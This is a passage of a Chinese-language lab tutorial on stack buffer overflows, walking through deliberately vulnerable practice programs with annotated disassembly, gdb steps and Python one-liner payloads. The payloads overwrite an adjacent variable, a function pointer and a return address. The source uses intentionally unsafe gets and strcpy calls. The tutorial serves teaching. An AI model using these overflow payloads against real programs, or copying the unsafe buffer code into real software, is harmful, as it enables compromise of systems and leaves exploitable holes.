%ebp</span><br><span class="line"></span><br><span class="line">0x080482a1 &lt;+1&gt;:    mov    %esp,%ebp</span><br><span class="line"></span><br><span class="line">0x080482a3 &lt;+3&gt;:    and    $0xfffffff0,%esp</span><br><span class="line"></span><br><span class="line">; esp = esp - 0x60，即在栈上分配0x60）字节的空间</span><br><span class="line"></span><br><span class="line">0x080482a6 &lt;+6&gt;:    sub    $0x60,%esp</span><br><span class="line"></span><br><span class="line">; 判断命令行参数的个数是否为1</span><br><span class="line"></span><br><span class="line">0x080482a9 &lt;+9&gt;:    cmpl   $0x1,0x8(%ebp)</span><br><span class="line"></span><br><span class="line">0x080482ad &lt;+13&gt;:   jne    0x80482c7 &lt;main+39&gt;</span><br><span class="line"></span><br><span class="line">0x080482af &lt;+15&gt;:   movl   $0x80b3dac,(%esp)</span><br><span class="line"></span><br><span class="line">0x080482b6 &lt;+22&gt;:   call   0x80493c0 &lt;puts&gt;</span><br><span class="line"></span><br><span class="line">0x080482bb &lt;+27&gt;:   movl   $0x1,(%esp)</span><br><span class="line"></span><br><span class="line">0x080482c2 &lt;+34&gt;:   call   0x8048e90 &lt;exit&gt;</span><br><span class="line"></span><br><span class="line">; 命令参数个数不是1，说明传入了命令行参数</span><br><span class="line"></span><br><span class="line">; modified变量位于esp + 0x5C处，将其初始化为0</span><br><span class="line"></span><br><span class="line">0x080482c7 &lt;+39&gt;:   movl   $0x0,0x5c(%esp)</span><br><span class="line"></span><br><span class="line">; 通过ebp + 0xC获取argv参数的值</span><br><span class="line"></span><br><span class="line">0x080482cf &lt;+47&gt;:   mov    0xc(%ebp),%eax</span><br><span class="line"></span><br><span class="line">; eax = eax + 4</span><br><span class="line"></span><br><span class="line">0x080482d2 &lt;+50&gt;:   add    $0x4,%eax</span><br><span class="line"></span><br><span class="line">; 取argv[1]的值</span><br><span class="line"></span><br><span class="line">0x080482d5 &lt;+53&gt;:   mov    (%eax),%eax</span><br><span class="line"></span><br><span class="line">; 将argv[1]作为strcpy的第二个参数值</span><br><span class="line"></span><br><span class="line">0x080482d7 &lt;+55&gt;:   mov    %eax,0x4(%esp)</span><br><span class="line"></span><br><span class="line">; buffer位于esp + 0x1C处，buffer作为strcpy的第一个参数值</span><br><span class="line"></span><br><span class="line">0x080482db &lt;+59&gt;:   lea    0x1c(%esp),%eax</span><br><span class="line"></span><br><span class="line">0x080482df &lt;+63&gt;:   mov    %eax,(%esp)</span><br><span class="line"></span><br><span class="line">; 调用strcpy进行字符串复制</span><br><span class="line"></span><br><span class="line">0x080482e2 &lt;+66&gt;:   call   0x80525b0 &lt;strcpy&gt;</span><br><span class="line"></span><br><span class="line">; 判断modified的值是否为0x61626364</span><br><span class="line"></span><br><span class="line">0x080482e7 &lt;+71&gt;:   cmpl   $0x61626364,0x5c(%esp)</span><br><span class="line"></span><br><span class="line">; 不相等则跳转并输出失败信息</span><br><span class="line"></span><br><span class="line">0x080482ef &lt;+79&gt;:   jne    0x80482ff &lt;main+95&gt;</span><br><span class="line"></span><br><span class="line">; 输出成功提示信息</span><br><span class="line"></span><br><span class="line">0x080482f1 &lt;+81&gt;:   movl   $0x80b3dc8,(%esp)</span><br><span class="line"></span><br><span class="line">0x080482f8 &lt;+88&gt;:   call   0x80493c0 &lt;puts&gt;</span><br><span class="line"></span><br><span class="line">0x080482fd &lt;+93&gt;:   jmp    0x8048314 &lt;main+116&gt;</span><br><span class="line"></span><br><span class="line">0x080482ff &lt;+95&gt;:   mov    $0x80b3de8,%eax</span><br><span class="line"></span><br><span class="line">0x08048304 &lt;+100&gt;:  mov    0x5c(%esp),%edx</span><br><span class="line"></span><br><span class="line">0x08048308 &lt;+104&gt;:  mov    %edx,0x4(%esp)</span><br><span class="line"></span><br><span class="line">0x0804830c &lt;+108&gt;:  mov    %eax,(%esp)</span><br><span class="line"></span><br><span class="line">0x0804830f &lt;+111&gt;:  call   0x8049390 &lt;printf&gt;</span><br><span class="line"></span><br><span class="line">0x08048314 &lt;+116&gt;:  mov    $0x0,%eax</span><br><span class="line"></span><br><span class="line">0x08048319 &lt;+121&gt;:  leave</span><br><span class="line"></span><br><span class="line">0x0804831a &lt;+122&gt;:  ret</span><br></pre></td></tr></table></figure><p>通过对上面的汇编代码进行分析，我们知道buffer位于esp+0x1C处，而modified位于esp+0x5C处，两个地址的距离为0x5C - 0x1C &#x3D; 0x40，即64，刚好为buffer数组的大小。因此当我们输入的数据超过64字节时，modified变量就可以被覆盖，但需要控制modified变量的值还需要小心的构造命令行参数。</p><p>下面在gdb中进行验证，在gdb中执行b * 0x080482e7命令对strcpy的下一条指令下一个断点</p><p>在gdb中执行r命令，如下（r后面的数据为64个A以及1234）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">r AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA1234 </span><br></pre></td></tr></table></figure><p>即r命令后加上空格可以接一个命令行参数，用于传递给被调试的程序。按下Enter键程序就在断点处断下了：</p><p><img src="/.io//image-20240208204344435.png" alt="image-20240208204344435"></p><p>变量值已被修改。</p><p> 使用x &#x2F;4xb $esp+0x5C命令，以字节为单位查看内存中0x34333231的表示（其中&#x2F;4xb用于控制输出格式，4表示4个长度单位，x表示以16进制方式显示，b表示单位为字节）：</p><p><img src="/.io//image-20240208204517047.png" alt="image-20240208204517047"></p><p>现在modified变量的值已经被修改成0x34333231了，结合我们的输入数据‘A….A1234’，1234为低地址往高地址方向，可以判断这是小端格式的表示法。</p><p>在gdb中输入c命令就可以让程序继续执行，看到输出了错误的提示信息：</p><p><img src="/.io//image-20240208204548983.png" alt="image-20240208204548983"></p><p>现在我们只要合理控制命令行参数的第65~68字节的内容，就可以成功发起溢出攻击了。q退出gdb</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="string">&quot;print &#x27;A&#x27;*64+&#x27;\x64\x63\x62\x61&#x27;&quot;</span> | xargs ./pwn2</span><br></pre></td></tr></table></figure><p>使用管道方式传参数，pwn程序。</p><p><img src="/.io//image-20240208204738100.png" alt="image-20240208204738100"></p><h1 id="函数指针覆盖"><a href="#函数指针覆盖" class="headerlink" title="函数指针覆盖"></a>函数指针覆盖</h1><h2 id="背景-2"><a href="#背景-2" class="headerlink" title="背景"></a>背景</h2><p>使用objdump工具可以查看一个目标文件的许多内部信息，objdump有许多可选的参数选项，通过控制这些参数选项可以输出不同的文件信息。在对二进制程序进行分析时，我们可以使用objdump获取二进制程序中代码段的反汇编指令列表，从而获取某一个函数的具体地址信息。</p><p>执行objdump -d pwn4可以看到关于pwn4程序的反汇编指令列表，其中-d选项表示进行反汇编操作。</p><p>函数指针（Function Pointer）是指向函数的指针，函数指针可以像一般函数一样，用于调用函数、传递参数。在C &#x2F;C++这样的语言中，通过提供一个简单的选取、执行函数的方法，函数指针可以简化代码。</p><p>   函数指针只能指向具有特定特征的函数，因而所有被同一指针运用的函数必须具有相同的参数和返回类型。</p><p>   通常使用typedef来定义一个函数指针类型，如：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">void</span><span class="params">(*func)</span><span class="params">()</span></span>;</span><br></pre></td></tr></table></figure><p>  定义了func这样的函数指针类型，其可以指向返回值类型为void且没有函数参数的函数，比如void test()这样的函数，可以使用func myfp &#x3D; test;来定义一个myfp变量，该变量指向test函数，通过执行myfp()可以达到执行test()函数同样的效果。</p><p>主机&#x2F;home&#x2F;test&#x2F;4目录下有一个pwn4程序，执行这个程序可以输入数据进行测试，当输入一定的数据量时，可能什么都不会提示程序就结束运行了，也可能会提示这样的信息：</p><p>calling function pointer, jumping to 0x41414141</p><p>Segmentation fault</p><p>当输入的精心构造的输入数据时可对程序发起溢出攻击，达到改写程序执行流程的目的，攻击成功时将输出如下信息：</p><p>calling function pointer, jumping to 0xXXXXXXXX</p><p>Congratulations, you pwned it.</p><p>源代码：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">void</span><span class="params">(*func)</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">win</span><span class="params">()</span><span class="comment">//输出成功提示信息的函数</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Congratulations, you pwned it.\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argc,<span class="type">char</span>** argv)</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">    func fp;</span><br><span class="line"></span><br><span class="line"><span class="type">char</span> buffer[<span class="number">64</span>];</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">    fp =<span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">gets</span>(buffer);<span class="comment">// 可引发缓冲区溢出</span></span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(fp)<span class="comment">// 判断函数指针变量fp是否不为NULL</span></span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;calling function pointer, jumping to 0x%08X\n&quot;</span>, fp);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">fp</span>();<span class="comment">//调用fp</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>程序定义了一个与buffer相邻的函数指针变量fp，然后使用gets获取输入数据，我们知道gets是不安全的函数，这里会引发缓冲区溢出，fp变量的值可以被改写，当fp的值被改写为win函数的地址时，就可以输出成功提示的信息。</p><h2 id="利用缓冲区溢出改写函数指针"><a href="#利用缓冲区溢出改写函数指针" class="headerlink" title="利用缓冲区溢出改写函数指针"></a>利用缓冲区溢出改写函数指针</h2><p>一样查看主函数的反汇编</p><p><img src="/.io//image-20240208205610265.png" alt="image-20240208205610265"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">0x08048428 &lt;+0&gt;:push   %ebp</span><br><span class="line"></span><br><span class="line">0x08048429 &lt;+1&gt;:mov    %esp,%ebp</span><br><span class="line"></span><br><span class="line">0x0804842b &lt;+3&gt;:and    $0xfffffff0,%esp</span><br><span class="line"></span><br><span class="line">; 在栈上开辟0x60字节的空间</span><br><span class="line"></span><br><span class="line">0x0804842e &lt;+6&gt;:sub    $0x60,%esp</span><br><span class="line"></span><br><span class="line">; 初始化fp的值为NULL，其中fp位于[esp+0x5c]</span><br><span class="line"></span><br><span class="line">0x08048431 &lt;+9&gt;:     movl   $0x0,0x5c(%esp)</span><br><span class="line"></span><br><span class="line">; 执行gets(buffer)，其中buffer位于[esp+0x1c]</span><br><span class="line"></span><br><span class="line">0x08048439 &lt;+17&gt;:lea0x1c(%esp),%eax</span><br><span class="line"></span><br><span class="line">0x0804843d &lt;+21&gt;:mov    %eax,(%esp)</span><br><span class="line"></span><br><span class="line">0x08048440 &lt;+24&gt;:call0x8048320&lt;gets@plt&gt;</span><br><span class="line"></span><br><span class="line">; 判断fp是否为NULL</span><br><span class="line"></span><br><span class="line">0x08048445 &lt;+29&gt;:    cmpl   $0x0,0x5c(%esp)</span><br><span class="line"></span><br><span class="line">0x0804844a &lt;+34&gt;:je0x8048467&lt;main+63&gt;</span><br><span class="line"></span><br><span class="line">0x0804844c &lt;+36&gt;:mov    $0x8048554,%eax</span><br><span class="line"></span><br><span class="line">0x08048451 &lt;+41&gt;:mov0x5c(%esp),%edx</span><br><span class="line"></span><br><span class="line">0x08048455 &lt;+45&gt;:mov    %edx,0x4(%esp)</span><br><span class="line"></span><br><span class="line">0x08048459 &lt;+49&gt;:mov    %eax,(%esp)</span><br><span class="line"></span><br><span class="line">0x0804845c &lt;+52&gt;:call0x8048340 &lt;printf@plt&gt;</span><br><span class="line"></span><br><span class="line">; 执行fp()</span><br><span class="line"></span><br><span class="line">0x08048461 &lt;+57&gt;:mov0x5c(%esp),%eax</span><br><span class="line"></span><br><span class="line">0x08048465 &lt;+61&gt;:call*%eax</span><br><span class="line"></span><br><span class="line">0x08048467 &lt;+63&gt;:mov    $0x0,%eax</span><br><span class="line"></span><br><span class="line">0x0804846c &lt;+68&gt;:leave</span><br><span class="line"></span><br><span class="line">0x0804846d &lt;+69&gt;:ret</span><br></pre></td></tr></table></figure><p>通过对上面的汇编代码进行分析，我们知道buffer位于esp+0x1c处，而fp位于esp+0x5c处，两个地址的距离为0x5c - 0x1c &#x3D; 0x40，即64，刚好为buffer数组的大小。因此当输入数据的长度超过64字节时，fp变量就可以被覆盖，但需要控制fp变量的值还需要小心的构造数据。我们只要合理控制环境变量参数的第65~68字节的内容，就可以成功发起溢出攻击了。</p><p>现在的问题是找到函数win的地址信息，然后将fp的值改写为win函数的地址，这样就可以达到调用win函数的目的了。前面提到过使用objdump可以查看函数的地址</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">objdump -d pwn4</span><br></pre></td></tr></table></figure><p>在输出信息中找到win函数的信息：</p><p><img src="/.io//image-20240208210003800.png" alt="image-20240208210003800"></p><p>或者可以跟着用grep命令，快速找到那一行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">objdump -d pwn4 | grep win</span><br></pre></td></tr></table></figure><p>可以看到win函数的地址为0x08048414，因为机器采用小端格式，因此执行下面的语句就可以成功发起溢出攻击了：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="string">&quot;print &#x27;A&#x27;*64+&#x27;\x14\x84\x04\x08&#x27;&quot;</span> | ./pwn4</span><br></pre></td></tr></table></figure><p><img src="/.io//image-20240208210108784.png" alt="image-20240208210108784"></p><h1 id="返回地址覆盖"><a href="#返回地址覆盖" class="headerlink" title="返回地址覆盖"></a>返回地址覆盖</h1><h2 id="背景-3"><a href="#背景-3" class="headerlink" title="背景"></a>背景</h2><p>函数调用约定描述了函数传递参数的方式和栈协同工作的技术细节，不同的函数调用约定原理基本相同，但在细节上是有差别的，包括函数参数的传递方式、参数的入栈顺序、函数返回时由谁来平衡堆栈扥。本实验中着重讲解C语言函数调用约定。</p><p>通过前面几个PWN系列实验的学习，也许你已经发现了在gdb中通过disas指令对main函数进行反汇编时，函数的开头和结尾的反汇编指令都是一样的：</p><p>push  %ebp</p><p>mov  %esp,%ebp</p><p>……</p><p>leave</p><p>ret</p><p>在函数的开头，首先是一条push %ebp指令，将ebp寄存器压入栈中，用于保存ebp寄存器的值，接着是mov %esp,%ebp将esp寄存器的值传递给ebp寄存器；在函数的末尾，leave指令相当于mov %ebp,%esp和pop %ebp两条指令，其作用刚好与开头的两条指令相反，即恢复esp和ebp寄存器的内容。</p><p>如果在函数A中调用了函数B，我们称函数A为主调函数，函数B为被调函数，如果函数B的声明为int B(int arg1, int arg2, int arg3)，那么函数A中的调用函数B时的汇编指令的形式如下：</p><p>push arg3</p><p>push arg2</p><p>push arg1</p><p>call B</p><p>连续三个push将函数的参数按照从右往左的顺序进行压栈，然后执行call B来调用函数B。注意在gdb中看到的效果可能不是三个push，而是三个mov来对栈进行操作，这是因为Linux采用AT&amp;T风格的汇编，而上面的指令使用的是Intel风格的汇编，比较容易理解。</p><p>call指令的内部细节为：将下一条指令的地址压入栈中，然后跳转到函数B去执行代码。这里说的call下一条指令的地址也就是通常所说的返回地址。函数B最后一条retn指令会从栈上弹出返回地址，并赋值给EIP寄存器，达到返回函数A继续执行的目的。</p><p><img src="/.io//image-20240209174948974.png" alt="image-20240209174948974"></p><p>基本的缓冲区溢出攻击通常是通过改写函数返回地址的形式来发起攻击的。如A调用B函数，正常情况下B函数返回时执行retn指令，从栈上取出返回地址跳转回A函数继续执行代码。而一旦返回地址被缓冲区溢出数据改写，那么我们就可以控制函数B跳转到指定的地方去执行代码了。</p><p><img src="/.io//image-20240209175005807.png" alt="image-20240209175005807"></p><p>主机&#x2F;home&#x2F;test&#x2F;5目录下有一个pwn5程序，执行这个程序可以输入数据进行测试，正常情况下程序接收输入数据后不会产生任何输出信息并直接退出，然后当输入一定的数据量时，可能会提示Segmentation fault的错误信息，当输入的精心构造的输入数据时可对程序发起溢出攻击，达到改写程序执行流程的目的，攻击成功时将输出如下信息：</p><p>Congratulations, you pwned it.</p><p>源代码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">void</span> <span class="title function_">win</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Congratulations, you pwned it.\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>** argv)</span></span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> buffer[<span class="number">64</span>];</span><br><span class="line"></span><br><span class="line">    gets(buffer);    <span class="comment">// 存在缓冲区溢出</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>程序定义了一个64字节大小的buffer数组，然后使用gets获取输入数据，我们知道gets是不安全的函数，这里会引发缓冲区溢出，栈上函数的返回地址可以被改写，当返回地址被改写为win函数的地址时，就可以输出成功提示的信息。</p><h2 id="返回地址覆盖-1"><a href="#返回地址覆盖-1" class="headerlink" title="返回地址覆盖"></a>返回地址覆盖</h2><p>利用gdb调试，查看主函数汇编</p><p><img src="/.io//image-20240209175221359.png" alt="image-20240209175221359"></p><p>显然在0x08048408存在溢出漏洞</p><p>首先使用b *0x080483f8对main函数的第一条指令下一个断点，同时使用b *0x08048408对gets函数的调用下一个断点，然后输入r命令运行程序，将会在第一个断点处断下</p><p>查看esp寄存器的值</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">i r <span class="variable">$esp</span></span><br></pre></td></tr></table></figure><p><img src="/.io//image-20240209175440796.png" alt="image-20240209175440796"></p><p>这时候esp寄存器的值为0xffffd6cc。按C继续执行，在第二个断点断下，通过对汇编指令的分析，我们知道eax寄存器存储了buffer的起始地址，所以运行<code>i r $eax</code>来查看buffer的地址：</p><p><img src="/.io//image-20240209175603275.png" alt="image-20240209175603275"></p><p>我们看到eax寄存器的值为0xffffd680，那么这两个地址的差为76，如下图下图所示：</p><p><img src="/.io//image-20240209175633692.png" alt="image-20240209175633692"></p><p>也就是说，在覆盖了76字节数据后，如果再覆盖4个字节，就可以把返回地址覆盖为我们想要的地址了。</p><p>在gdb中执行disas win查看win函数的地址为0x080483e4，或者objdump。接下来就可以构造输入数据来发起溢出攻击了。</p><p><img src="/.io//image-20240209175753177.png" alt="image-20240209175753177"></p><p>通过上面的步骤我们已经知道，只要合理控制输入数据的第77~80字节的内容，就可以实现对函数返回地址进行覆盖，从而成功发起溢出攻击了。</p><p>现在win函数的地址为0x080483e4，转换为小端格式就是’\xe4\x83\x04\x08’，那么可以构造这样的命令来进行溢出测试：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="string">&quot;print &#x27;A&#x27;*76+&#x27;\xe4\x83\x04\x08&#x27;&quot;</span> | ./pwn5</span><br></pre></td></tr></table></figure><p><img src="/.io//image-20240209175905857.png" alt="image-20240209175905857"></p><h1 id="环境变量继承"><a href="#环境变量继承" class="headerlink" title="环境变量继承"></a>环境变量继承</h1><h2 id="背景-4"><a href="#背景-4" class="headerlink" title="背景"></a>背景</h2><p>在Linux&#x2F;Windows操作系统中, 每个进程都有其各自的环境变量设置。 缺省情况下, 当一个进程被创建时，除了创建过程中的明确更改外，它继承了其父进程的绝大部分环境变量信息。</p><p>   扩展的C语言main函数可以传递三个参数，除了argc和argv参数外，还能接受一个char**类型的envp参数。envp指向一个字符串数组，该数组存储了当前进程具体的环境变量的内容，envp的最后一个元素指向NULL，此为envp结束的标识符。</p><p>   打印环境变量参数信息的示例代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc,<span class="type">char</span>** argv,<span class="type">char</span>** envp)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> i =<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>(envp[i])</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;envp[%2d] = %s\n&quot;</span>, i, envp[i]);</span><br><span class="line">        i +=<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>编译这段代码生成env程序，然后在命令行下执行，可以看到程序打印出了具体的环境变量参数信息：</p><p>环境变量的格式为：环境变量名&#x3D;环境变量值</p><p>当父进程启动一个子进程时，子进程会继承父进程的环境变量信息。在Linux Shell下，通过export可以给Shell添加一个环境变量，此后通过Shell启动的子进程都会拥有这个环境变量。</p><p><img src="/.io//image-20240209180224864.png" alt="image-20240209180224864"></p><p>在Shell中执行export testenv&#x3D;”Hello_World”之后，再执行.&#x2F;env，可以看到新的环境变量已经被子进程继承了。</p><p><img src="/.io//image-20240209180237403.png" alt="image-20240209180237403"></p><p> Python的os模块提供创建子进程以及修改环境变量的函数，其中os.system函数可以创建一个子进程，且子进程会继承父进程的环境变量参数信息；os.putenv可以修改进程的环境变量参数信息。</p><p>Linux Shell中，可以使用$()或者两个反引号（&#96; ）来包裹一条shell命令，并返回shell命令的执行结果。 </p><p>比如执行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">export</span> testenv2=`python -c <span class="string">&quot;print &#x27;A&#x27;*20&quot;</span>`</span><br></pre></td></tr></table></figure><p>命令后，再执行.&#x2F;env可以看到有一个名为testenv2的环境变量，其值为20个A。</p><p>主机&#x2F;home&#x2F;test&#x2F;3目录下有一个pwn3程序，这个程序会对进程中名为HEETIAN的环境变量的值进行处理，通过构造特定的环境变量参数数据可以对程序发起溢出攻击，成功会提示<strong>Congratulations, you pwned it.<strong>，失败则会提示</strong>Please try again.<strong>的提示信息。注意：如果没有设置HEETIAN这个环境变量，那么运行程序后将输出</strong>Please set the HEETIAN environment variable</strong>，之后程序自动退出。</p><p>源代码：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argc,<span class="type">char</span>** argv)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> modified;</span><br><span class="line">    <span class="type">char</span> buffer[<span class="number">64</span>];</span><br><span class="line">    <span class="type">char</span>* variable;</span><br><span class="line">    variable = <span class="built_in">getenv</span>(<span class="string">&quot;HEETIAN&quot;</span>);<span class="comment">// 获取环境变量HEETIAN的值</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(variable ==<span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;Please set the HEETIAN environment variable\n&quot;</span>);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">        modified =<span class="number">0</span>;</span><br><span class="line">        <span class="built_in">strcpy</span>(buffer, variable);<span class="comment">// 调用strcpy进行字符串复制，可引发缓冲区溢出</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(modified ==<span class="number">0x0d0a0d0a</span>)<span class="comment">// 判断modified的值是否为0x0d0a0d0a</span></span><br><span class="line">    &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;Congratulations, you pwned it.\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;Please try again, you got 0x%08X\n&quot;</span>, modified);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="环境变量继承-1"><a href="#环境变量继承-1" class="headerlink" 